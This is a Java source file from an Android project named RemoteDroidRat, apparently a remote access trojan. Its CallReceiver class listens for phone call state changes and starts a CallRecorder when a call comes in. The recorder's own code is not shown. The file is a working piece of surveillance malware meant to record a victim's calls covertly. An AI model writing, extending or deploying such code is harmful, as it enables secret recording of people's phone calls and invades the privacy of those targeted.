package com.KaranKumar.RemoteDroidRat.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import com.KaranKumar.RemoteDroidRat.commandActions.CallRecorder;

public class CallReceiver extends BroadcastReceiver {
	private CallRecorder callRecorder;

    @Override
    public void onReceive(final Context context, Intent intent) {
        // Register the PhoneStateListener to monitor changes in call state
		   this.callRecorder = new CallRecorder(context);
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        PhoneStateListener phoneStateListener = new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String phoneNumber) {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:
                        // Incoming call
                        // Perform your action for incoming call
						try{

							callRecorder.startCallListener();
						}catch(Exception e){
							e.printStackTrace();
						}
                        Toast.makeText(context, "Incoming call", Toast.LENGTH_SHORT).show();
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        // Call established
                        // Perform your action when the call is answered
                        Toast.makeText(context, "Call answered", Toast.LENGTH_SHORT).show();
                        break;
                    case TelephonyManager.CALL_STATE_IDLE:
                        // Call ended
                        // Perform your action when the call ends
                        Toast.makeText(context, "Call ended", Toast.LENGTH_SHORT).show();
                        break;
                }
            }
        };

        // Register the listener with the TelephonyManager
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
    }
}
